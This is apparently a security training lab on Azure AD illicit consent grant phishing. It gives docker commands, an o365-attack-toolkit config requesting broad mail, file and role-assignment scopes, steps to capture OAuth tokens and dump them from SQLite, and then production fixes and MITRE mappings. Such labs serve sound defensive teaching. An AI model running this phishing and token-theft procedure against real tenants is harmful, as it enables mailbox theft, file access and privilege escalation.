# Illicit Consent Grant

**Difficulty:** Intermediate | **Provider:** Azure | **Category:** Identity / OAuth Phishing

## Scenario

An attacker registers an Azure AD application and crafts a phishing URL requesting
dangerous OAuth delegated permissions (`mail.read`, `files.readWrite.all`,
`AppRoleAssignment.ReadWrite.All`). When a Global Administrator clicks the link and grants
consent, the attacker receives an access token with those permissions — enabling mail
access, file access, and privilege escalation.

This lab uses the containerised [o365-attack-toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)
to automate phishing URL generation and token capture.

## Attack Path

```
[Attacker] configures o365-attack-toolkit with lab app credentials
    |
    v
Craft phishing URL  -->  victim visits and grants consent
    |
    v
Authorization code redirected to attacker's server
    |
    v
Exchange code for access + refresh tokens (stored in SQLite)
    |
    v
Use access token to call Graph API (read mail, add app roles, etc.)
```

### Step 1 — Pull and configure the toolkit

```bash
docker pull cumulonimbuscloud/o365-attack-toolkit
docker run --network=host -v /tmp:/tmp -it \
  --entrypoint /bin/bash cumulonimbuscloud/o365-attack-toolkit:latest
```

Create `/go/src/o-365-toolkit/template.conf`:

```ini
[server]
host         = 127.0.0.1
externalport = 30662
internalport = 8080

[oauth]
clientid     = "<app-id from lab output>"
clientsecret = "<client-secret from lab output>"
scope        = "offline_access contacts.read user.read mail.read mail.send \
                files.readWrite.all openid profile AppRoleAssignment.ReadWrite.All"
redirecturi  = "http://localhost:30662/gettoken"
```

### Step 2 — Start the server and copy the phishing link

```bash
cd /go/src/o-365-toolkit && ./o365-attack-toolkit
# Visit http://127.0.0.1:8080/ — red button copies the phishing URL
```

### Step 3 — Simulate victim consent

Open the phishing URL in a browser and sign in with the admin credentials from the lab
output. After consent, the toolkit captures the tokens automatically.

### Step 4 — Dump tokens from SQLite

```bash
sqlite3 /tmp/toolkit.db "SELECT * FROM tokens;"
```

Use the access token with the Graph API to escalate privileges.

## How to Fix in Production

1. **Restrict who can consent to applications**: Entra ID → Enterprise Applications →
   Consent and Permissions → require admin approval for all third-party app consent.
2. **Enable the admin consent workflow** so users can request access rather than
   self-approving dangerous permissions.
3. **Review granted permissions regularly**: Entra ID → Enterprise Applications →
   Permissions — look for broad delegated scopes granted to unknown applications.
4. **Alert on high-risk OAuth grants** using Microsoft Defender for Cloud Apps policies.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Steal Application Access Token | T1528 |
| Phishing: Spearphishing Link | T1566.002 |
| Valid Accounts: Cloud Accounts | T1078.004 |
